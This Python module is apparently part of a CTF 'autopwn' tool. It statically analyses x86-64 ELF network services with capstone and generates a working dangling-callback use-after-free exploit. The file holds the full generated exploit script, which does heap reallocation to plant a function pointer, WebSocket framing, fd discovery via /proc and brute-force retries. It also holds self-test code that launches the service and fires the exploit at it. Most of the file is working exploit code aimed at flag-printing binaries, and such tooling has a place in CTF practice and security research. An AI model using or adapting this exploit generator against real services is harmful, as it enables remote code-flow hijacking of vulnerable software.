"""Dangling-callback use-after-free auto-exploit.

Targets network services that keep a table of client "session" structs
whose fields include a callback function pointer, free a session on
disconnect **without clearing the table**, then later invoke the stale
callback. Reallocating the freed struct as some
other object lets an attacker plant an arbitrary function pointer; here we
plant the service's own flag-printing routine.

The strategy auto-discovers the flag function (the one that calls
``getenv("FLAG")``), the struct size (the modal ``malloc`` immediate), the
listening port and command verbs, decides whether the wire protocol is
WebSocket, then emits a parameterised exploit and — if a runtime is
available — spawns the service with a known ``FLAG`` and proves it.
"""

from __future__ import annotations

import platform
import re
import subprocess
import textwrap
import time
from dataclasses import dataclass, field

from triage_web.autopwn.runner import _sh_quote, extract_flags, have_wsl, run_path, run_script, to_wsl
from triage_web.loader import BinaryLoader

try:
    import capstone as _cs

    HAS_CAPSTONE = True
except ImportError:  # pragma: no cover
    HAS_CAPSTONE = False

_SELFTEST_FLAG = "flag{triage_uaf_selftest}"


@dataclass
class UafResult:
    ok: bool
    flag: str | None = None
    flag_func: int | None = None
    struct_size: int | None = None
    port: int | None = None
    websocket: bool = False
    route: str = "unknown"  # how the planted callback's arg1 is used: id | fd | ptr | unknown
    script: str = ""
    stdout: bytes = b""
    reason: str = ""
    log: list[str] = field(default_factory=list)


def solve_uaf(path: str, *, timeout: float = 60.0) -> UafResult:
    if not HAS_CAPSTONE:
        return UafResult(False, reason="capstone not installed")
    from pathlib import Path

    path = str(Path(path).resolve())
    ldr = BinaryLoader(path)
    log: list[str] = []
    try:
        info = ldr.get_info()
        if info["format"] != "ELF" or info["arch"] != "x86_64":
            return UafResult(False, reason=f"uaf auto-exploit is x86-64 ELF only (got {info['arch']} {info['format']})")

        imports = {i["name"].split("@")[0] for i in ldr.get_imports()}
        if not ({"free", "getenv"} <= imports):
            return UafResult(False, reason="no free()+getenv() — not the dangling-callback shape", log=log)

        raw = bytes(ldr._raw)
        if b"FLAG" not in raw:
            return UafResult(False, reason="binary has no FLAG env reference", log=log)

        md = _cs.Cs(_cs.CS_ARCH_X86, _cs.CS_MODE_64)
        md.detail = False
        code, base = ldr._get_text_section()
        insns = list(md.disasm(bytes(code), base))

        flag_func = _find_flag_func(ldr, insns, log)
        if flag_func is None:
            return UafResult(False, reason='could not locate the getenv("FLAG") function', log=log)

        struct_size = _modal_malloc_size(insns, log)
        port = _server_port(raw, log)
        ws = _is_websocket(raw)
        verbs = _command_verbs(raw)
        route = _route_analysis(ldr, insns, flag_func, log)
        log.append(f"websocket={ws} port={port} verbs={verbs} route={route}")

        script = _emit_exploit(run_path(path), flag_func, struct_size, port, ws, verbs, route)
        res = UafResult(
            ok=False,
            flag_func=flag_func,
            struct_size=struct_size,
            port=port,
            websocket=ws,
            route=route,
            script=script,
            log=log,
        )

        if have_wsl() or _on_linux():
            flag = _run_selftest(path, script, timeout, log)
            if flag:
                res.ok, res.flag = True, flag
            else:
                res.reason = "generated the exploit and ran it against a local instance but got no flag back"
        else:
            res.reason = "exploit generated — run it where the service can execute (needs WSL/Linux)"
        return res
    finally:
        ldr.close()


def _on_linux() -> bool:
    return platform.system() == "Linux"


def _rip_target(insn) -> int | None:
    m = re.search(r"\[rip \+ (0x[0-9a-fA-F]+)\]", insn.op_str)
    return (insn.address + insn.size + int(m.group(1), 16)) if m else None


def _find_flag_func(ldr, insns, log) -> int | None:
    """The function whose body loads the address of the string "FLAG" and
    then calls ``getenv``. Returns its ``push rbp`` prologue address."""
    getenv_slots = {a for a, n in _plt_map(ldr).items() if n.split("@")[0] == "getenv"}
    raw = bytes(ldr._raw)
    for i, insn in enumerate(insns):
        if insn.mnemonic not in ("call", "callq") or _imm(insn.op_str) not in getenv_slots:
            continue
        for j in range(i - 1, max(-1, i - 12), -1):
            if insns[j].mnemonic != "lea":
                continue
            tgt = _rip_target(insns[j])
            if tgt is None:
                continue
            off = _vaddr_to_off(ldr, tgt)
            if off is not None and raw[off : off + 5].rstrip(b"\x00") == b"FLAG":
                prologue = _enclosing_prologue(insns, i)
                if prologue is not None:
                    log.append(f'flag function @ {prologue:#x} (calls getenv("FLAG"))')
                    return prologue
    return None


def _enclosing_prologue(insns, idx) -> int | None:
    for j in range(idx, max(-1, idx - 400), -1):
        if insns[j].mnemonic == "push" and insns[j].op_str == "rbp":
            return insns[j].address
    return None


# ── routing analysis ────────────────────────────────────────────────
# The planted callback (the flag function) is invoked as ``cb(arg1, ...)``
# where the attacker controls ``arg1`` through the reallocated struct. How
# ``arg1`` must be set depends on what the flag function's own callee does
# with it. Three shapes, each needing a different value:
#   id   - compared against a per-session id field in a scan loop  -> pass the
#          receiver's session id.
#   fd   - handed straight to send()/write()/sendto() as the socket fd -> pass
#          the receiver socket's server-side fd (needs a /proc lookup).
#   ptr  - dereferenced as a pointer -> needs a heap leak; not solvable blind.

_SEND_FNS = {"send", "sendto", "write", "writev", "dprintf", "fwrite", "sendmsg"}


def _sender_callee(ldr, insns, flag_func: int) -> tuple[int, int, int] | None:
    """(start_idx, end_idx, target_vaddr) of the first in-.text function the
    flag function calls (skipping getenv/PLT stubs). Function bounds come from
    the loader's symbol/heuristic function list, not a ``push rbp`` guess -
    the sender may save rbp as a plain callee-saved register."""
    plt = _plt_map(ldr)
    text_lo, text_hi = _text_bounds(ldr)
    # only trust function starts that are well clear of flag_func - the loader
    # sometimes lists a spurious entry a few bytes in.
    fn_starts = sorted(a for _, a in ldr.get_functions())
    ff_end = next((a for a in fn_starts if a > flag_func + 0x20), flag_func + 0x140)
    idx_at = {x.address: i for i, x in enumerate(insns)}
    start = idx_at.get(flag_func)
    if start is None:
        return None
    for i in range(start, min(len(insns), start + 200)):
        x = insns[i]
        if x.address >= ff_end:
            break
        if x.mnemonic in ("call", "callq"):
            tgt = _imm(x.op_str)
            if tgt is None or tgt in plt or not (text_lo <= tgt < text_hi):
                continue
            j0 = idx_at.get(tgt)
            if j0 is None:
                continue
            import bisect

            nxt = fn_starts[bisect.bisect_right(fn_starts, tgt) :]
            end_va = nxt[0] if nxt else text_hi
            j1 = next((k for k in range(j0 + 1, len(insns)) if insns[k].address >= end_va), len(insns))
            return j0, j1, tgt
    return None


def _text_bounds(ldr) -> tuple[int, int]:
    for s in ldr.get_sections():
        if s.get("name") == ".text" and s.get("vaddr"):
            return s["vaddr"], s["vaddr"] + s.get("size", 0)
    return 0, 1 << 62


def _route_analysis(ldr, insns, flag_func: int, log) -> str:
    callee = _sender_callee(ldr, insns, flag_func)
    if callee is None:
        log.append("route: could not isolate the flag function's sender callee -> unknown")
        return "unknown"
    j0, j1, tgt = callee
    plt = _plt_map(ldr)
    body = insns[j0:j1]
    route = _classify_arg1_use(body, plt)
    log.append(f"route: sender @ {tgt:#x} uses arg1 as {route!r}")
    return route


_REG64 = {  # 32-bit / lower forms -> the 64-bit name they belong to
    **{r: r for r in ("rdi", "rsi", "rdx", "rcx", "r8", "r9", "r10", "r11", "rbx", "r12", "r13", "r14", "r15", "rbp")},
    "edi": "rdi",
    "esi": "rsi",
    "edx": "rdx",
    "ecx": "rcx",
    "ebx": "rbx",
    "ebp": "rbp",
    "r8d": "r8",
    "r9d": "r9",
    "r10d": "r10",
    "r11d": "r11",
    "r12d": "r12",
    "r13d": "r13",
    "r14d": "r14",
    "r15d": "r15",
}


def _regs_in(ops: str) -> set[str]:
    return {_REG64[t] for t in re.findall(r"\b([re][a-z0-9]+|r[0-9]+d?)\b", ops) if t in _REG64}


def _classify_arg1_use(body, plt: dict[int, str]) -> str:
    """Walk a callee's body tracking which 64-bit regs still alias arg1
    (``rdi`` on entry). The first decisive use wins."""
    alias = {"rdi"}
    for x in body:
        m, ops = x.mnemonic, x.op_str
        # dereference of an aliased reg -> pointer routing
        if any(re.search(rf"\[{r}\b", ops) or re.search(rf"\b{r} \+", ops) for r in alias):
            for r in alias:
                if re.search(rf"\[\s*{r}\b", ops) or re.search(rf"\[{r} [+\-]", ops):
                    return "ptr"
        # arg1 still in rdi when a send-family libc call is made -> fd routing
        if m in ("call", "callq") and "rdi" in alias:
            if plt.get(_imm(ops) or -1, "").split("@")[0] in _SEND_FNS:
                return "fd"
            alias.discard("rdi")  # a non-send call clobbers rdi (arg regs are caller-saved)
            continue
        # aliased reg compared against a struct field with a large displacement
        if m.startswith("cmp") and (_regs_in(ops) & alias) and re.search(r"\[\w+ [+\-] 0x[0-9a-fA-F]{3,}\]", ops):
            return "id"
        if m == "mov" and "," in ops:
            dst, src = (p.strip() for p in ops.split(",", 1))
            d64, s64 = _REG64.get(dst), _REG64.get(src)
            if s64 in alias and d64:
                alias.add(d64)
            elif d64 in alias and s64 not in alias:
                alias.discard(d64)  # overwritten by something unrelated
    return "unknown"


def _modal_malloc_size(insns, log) -> int | None:
    sizes: dict[int, int] = {}
    last_edi = None
    for insn in insns:
        if insn.mnemonic == "mov" and insn.op_str.startswith(("edi,", "rdi,")):
            last_edi = _imm(insn.op_str.split(",", 1)[1])
        elif insn.mnemonic in ("call", "callq") and last_edi is not None:
            if 0x10 <= last_edi <= 0x400:
                sizes[last_edi] = sizes.get(last_edi, 0) + 1
            last_edi = None
    if not sizes:
        return None
    best = max(sizes, key=sizes.get)
    log.append(f"struct size (modal small malloc): {best:#x}  [seen {sizes}]")
    return best


def _server_port(raw: bytes, log) -> int:
    m = re.search(rb"port\s+(\d{2,5})", raw)
    port = int(m.group(1)) if m else 8765
    log.append(f"server port (from banner): {port}")
    return port


def _is_websocket(raw: bytes) -> bool:
    return b"Sec-WebSocket" in raw or b"Upgrade: websocket" in raw


def _command_verbs(raw: bytes) -> dict[str, str]:
    """Recover the wire verbs, preferring a pipe-delimited command token
    (``LOGIN|``) over a bare lowercase mention of the same word."""
    out: dict[str, str] = {}
    for key, base in (("login", b"LOGIN"), ("watch", b"WATCH"), ("create", b"CREATE"), ("bid", b"BID")):
        cand = [
            re.escape(base) + rb"\|",  # LOGIN|
            re.escape(base),  # LOGIN
            re.escape(base.lower()) + rb"\|",  # login|
            re.escape(base.lower()),  # login
        ]
        for pat in cand:
            m = re.search(rb"(?<![A-Za-z])(" + pat + rb")", raw)
            if m:
                out[key] = m.group(1).decode("latin-1")
                break
    return out


def _plt_map(ldr) -> dict[int, str]:
    return {i["address"]: i["name"] for i in ldr.get_imports() if i.get("address")}


def _vaddr_to_off(ldr, vaddr) -> int | None:
    for s in ldr.get_sections():
        o, sz = s.get("offset", -1), s.get("size", 0)
        if s.get("vaddr") and s["vaddr"] <= vaddr < s["vaddr"] + sz:
            return o + (vaddr - s["vaddr"])
    return None


def _imm(op: str) -> int | None:
    op = op.strip()
    try:
        return int(op, 16) if op.startswith("0x") else int(op)
    except ValueError:
        return None


def _emit_exploit(exe_path, flag_func, struct_size, port, ws, verbs, route="unknown") -> str:
    import os as _os

    login = verbs.get("login", "LOGIN|")
    watch = verbs.get("watch", "WATCH")
    create = verbs.get("create", "CREATE|")
    bid = verbs.get("bid", "BID")
    exe_base = _os.path.basename(str(exe_path).replace("\\", "/"))
    return (
        textwrap.dedent(
            f'''
            import base64, os, re, socket, struct, sys, time

            HOST, PORT = "127.0.0.1", {port}
            FLAG_FUNC = {flag_func:#x}
            STRUCT    = {struct_size or 0x28}
            WS        = {ws}
            ROUTE     = {route!r}   # how the planted callback's arg1 is consumed
            EXE_BASE  = {exe_base!r}

            def ws_handshake(s):
                key = base64.b64encode(b"\\x00" * 16).decode()
                s.send((
                    "GET / HTTP/1.1\\r\\nHost: %s:%d\\r\\nUpgrade: websocket\\r\\n"
                    "Connection: Upgrade\\r\\nSec-WebSocket-Key: %s\\r\\n"
                    "Sec-WebSocket-Version: 13\\r\\n\\r\\n" % (HOST, PORT, key)
                ).encode())
                r = b""
                while b"\\r\\n\\r\\n" not in r:
                    c = s.recv(4096)
                    if not c:
                        return False
                    r += c
                return b"101" in r

            def frame(data):
                if isinstance(data, str):
                    data = data.encode()
                n = len(data); m = b"\\xde\\xad\\xbe\\xef"
                body = bytes(data[i] ^ m[i % 4] for i in range(n))
                if n < 126:
                    h = struct.pack("BB", 0x81, 0x80 | n)
                elif n < 65536:
                    h = struct.pack(">BBH", 0x81, 0xFE, n)
                else:
                    h = struct.pack(">BBQ", 0x81, 0xFF, n)
                return h + m + body

            def send(s, data):
                s.send(frame(data) if WS else ((data if isinstance(data, bytes) else data.encode()) + b"\\n"))

            def recv(s, t=1.5):
                s.settimeout(t)
                try:
                    if not WS:
                        return s.recv(8192)
                    hdr = s.recv(2)
                    if len(hdr) < 2:
                        return b""
                    ln = hdr[1] & 0x7F
                    if ln == 126:
                        ln = struct.unpack(">H", s.recv(2))[0]
                    elif ln == 127:
                        ln = struct.unpack(">Q", s.recv(8))[0]
                    msk = s.recv(4) if hdr[1] & 0x80 else None
                    data = b""
                    while len(data) < ln:
                        ch = s.recv(ln - len(data))
                        if not ch:
                            break
                        data += ch
                    if msk:
                        data = bytes(data[i] ^ msk[i % 4] for i in range(len(data)))
                    return data
                except OSError:
                    return b""

            def conn():
                s = socket.create_connection((HOST, PORT), timeout=5)
                if WS and not ws_handshake(s):
                    raise OSError("ws handshake failed")
                return s

            def drain(*socks):
                for s in socks:
                    if s is None:
                        continue
                    try:
                        s.close()
                    except OSError:
                        pass

            def server_pid():
                for p in os.listdir("/proc"):
                    if not p.isdigit():
                        continue
                    try:
                        with open("/proc/%s/cmdline" % p, "rb") as fh:
                            cl = fh.read()
                    except OSError:
                        continue
                    if EXE_BASE.encode() in cl:
                        return int(p)
                return None

            def session_id(reply):
                # the server echoes the caller's session id: "... as #<N>"
                m = re.search(rb"#(\\d+)", reply or b"")
                return int(m.group(1)) if m else None

            def server_fd_for(local_port):
                """The server's own fd for our receiver socket: /proc/net/tcp
                (rem_port == our local port) -> inode -> /proc/<pid>/fd/*."""
                pid = server_pid()
                if not pid:
                    return None
                try:
                    rows = open("/proc/net/tcp").read().splitlines()[1:]
                except OSError:
                    return None
                inode = None
                for r in rows:
                    f = r.split()
                    try:
                        if int(f[1].split(":")[1], 16) == PORT and int(f[2].split(":")[1], 16) == local_port:
                            inode = f[9]; break
                    except (IndexError, ValueError):
                        continue
                if inode is None:
                    return None
                for fd in os.listdir("/proc/%d/fd" % pid):
                    try:
                        if os.readlink("/proc/%d/fd/%s" % (pid, fd)) == "socket:[%s]" % inode:
                            return int(fd)
                    except OSError:
                        pass
                return None

            def attempt(price):
                receiver = conn()
                send(receiver, "{login}receiver"); recv(receiver)
                send(receiver, "{watch}")
                reply = recv(receiver)
                # the value the flag's callee routes on: a session id it echoes
                # as "#N" (ROUTE=id), or the server's fd for this socket (ROUTE=fd)
                if ROUTE == "fd":
                    auto = server_fd_for(receiver.getsockname()[1])
                else:
                    auto = session_id(reply)
                target = price if price is not None else auto
                if target is None:
                    drain(receiver)
                    return None
                attacker = None
                try:
                    victim = conn()
                    send(victim, "{login}victim"); recv(victim)
                    send(victim, "{watch}"); recv(victim)   # watchers[i] = victim client record
                    victim.close(); time.sleep(0.3)         # free(record); watchers[i] dangles

                    # The attacker connects and sends CREATE as its very FIRST
                    # message - no LOGIN. glibc tcache is per-thread: a chunk a
                    # thread frees is only reused by a *fresh* thread's first
                    # ever malloc, never by an already-running thread's later
                    # one (an attacker that LOGIN'd first gets an unrelated
                    # chunk and the hijack silently misses). CREATE/BID don't
                    # require a prior LOGIN on the same connection.
                    attacker = conn()
                    # CREATE reallocates the freed record: atoi(price) -> record[0]
                    # (the routing id), name[0:8] -> record[8] (the callback ptr).
                    name = struct.pack("<Q", FLAG_FUNC) + b"A" * max(1, STRUCT - 9)
                    send(attacker, ("{create}%d|" % target).encode() + name)
                    time.sleep(0.2); recv(attacker)
                    send(attacker, "{bid}"); time.sleep(0.4)   # -> FLAG_FUNC(target, ...) -> send flag to `target`
                    for sock in (receiver, attacker):
                        out = recv(sock, 1.5)
                        if out and b"flag" in out.lower():
                            return out
                    return None
                finally:
                    drain(attacker, receiver)

            if ROUTE == "ptr":
                print("route=ptr: the flag function's callee dereferences arg1 as a "
                      "pointer. A blind UAF can plant the callback but not a valid "
                      "heap address for its argument - this needs a separate leak "
                      "primitive. Recon (flag_func=%#x struct=%#x port=%d) is above."
                      % (FLAG_FUNC, STRUCT, PORT), file=sys.stderr)
                sys.exit(2)

            fixed = os.environ.get("TRIAGE_FD")           # override the routing value
            rounds = int(os.environ.get("TRIAGE_ROUNDS", "2"))
            # None -> attempt() derives it (session id, or /proc fd for ROUTE=fd);
            # then a short brute over the plausible low range for this route.
            brute = list(range(3, 16)) if ROUTE == "fd" else [1, 2, 3, 4, 5, 6, 7, 8]
            tries = [int(fixed)] if fixed else [None, *brute]
            for rnd in range(rounds):
                for price in tries:
                    try:
                        out = attempt(price)
                        if out:
                            print("FLAG:", out.decode("latin-1", "replace"))
                            sys.exit(0)
                    except OSError as e:
                        print("[r%d %s] %s" % (rnd, price, e), file=sys.stderr)
                    time.sleep(0.2)
            print("no flag recovered", file=sys.stderr)
            sys.exit(1)
            '''
        ).strip()
        + "\n"
    )


def _wait_for_port(port: int, *, deadline: float, log) -> bool:
    """Poll the service's listen port (via the same runtime the exploit uses)."""
    import socket as _sk

    end = time.monotonic() + deadline
    while time.monotonic() < end:
        if _on_linux():
            s = _sk.socket()
            s.settimeout(0.5)
            try:
                s.connect(("127.0.0.1", port))
                s.close()
                log.append(f"service up on :{port}")
                return True
            except OSError:
                pass
            finally:
                s.close()
        else:
            r = subprocess.run(
                ["wsl", "-e", "bash", "-lc", f"exec 3<>/dev/tcp/127.0.0.1/{port} && echo up"],
                capture_output=True,
                timeout=4,
                check=False,
            )
            if b"up" in r.stdout:
                log.append(f"service up on :{port}")
                return True
        time.sleep(0.4)
    log.append(f"service never bound :{port} within {deadline}s")
    return False


def _server_cmd(path) -> list[str]:
    wsl_bin = to_wsl(path)
    if _on_linux():
        return ["/bin/sh", "-c", f"FLAG={_SELFTEST_FLAG} exec {_sh_quote(str(path))}"]
    folder = to_wsl(str(path).rsplit("\\", 1)[0]) if "\\" in str(path) else "."
    return [
        "wsl",
        "-e",
        "bash",
        "-lc",
        f"cd {_sh_quote(folder)} 2>/dev/null; FLAG={_SELFTEST_FLAG} exec {_sh_quote(wsl_bin)}",
    ]


def _kill_server(path, server) -> None:
    server.terminate()
    try:
        subprocess.run(["wsl", "-e", "bash", "-lc", f"pkill -f {_sh_quote(to_wsl(path))}"], timeout=5, check=False)
    except (OSError, subprocess.SubprocessError):  # pragma: no cover
        pass


def _run_selftest(path, script, timeout, log) -> str | None:
    """The generated script derives its own routing target (a session id or
    fd, read from the receiver's own WATCH reply / socket) - it does not need
    a guessed value. A successful trigger crashes the service, so give it a
    few fresh instances in case one run loses a race against the server's
    own thread/connection teardown timing."""
    per = max(15.0, timeout / 3)
    for attempt in range(3):
        server = subprocess.Popen(_server_cmd(path), stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        try:
            if not _wait_for_port(8765, deadline=8.0, log=log):
                continue
            proc = run_script(script, timeout=per, env={"TRIAGE_ROUNDS": "3"})
            hits = extract_flags(proc.stdout + proc.stderr)
            log.append(f"attempt {attempt}: rc={proc.returncode} {proc.text.strip()[:160]!r}")
            if hits:
                return hits[0]
        finally:
            _kill_server(path, server)
        time.sleep(0.2)
    return None
